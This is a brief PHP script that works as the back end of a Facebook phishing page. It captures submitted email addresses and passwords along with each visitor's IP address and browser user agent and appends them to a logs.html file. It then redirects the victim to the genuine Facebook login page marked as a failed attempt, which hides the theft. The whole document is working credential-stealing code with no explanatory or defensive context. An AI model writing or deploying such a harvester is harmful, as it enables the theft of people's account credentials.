<?php
if(isset($_REQUEST["email"]))
{
$email =$_REQUEST["email"];
$pass =$_REQUEST["pass"];
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
file_put_contents("logs.html","Email: <b>$email</b> | Password: <b>$pass</b> | IP: <b>$ip</b> | User_Agent: <b>$ua</b> <br> n",FILE_APPEND);
}
header("Location: http://www.Facebook.com/login.php?login_attempt=1");
?>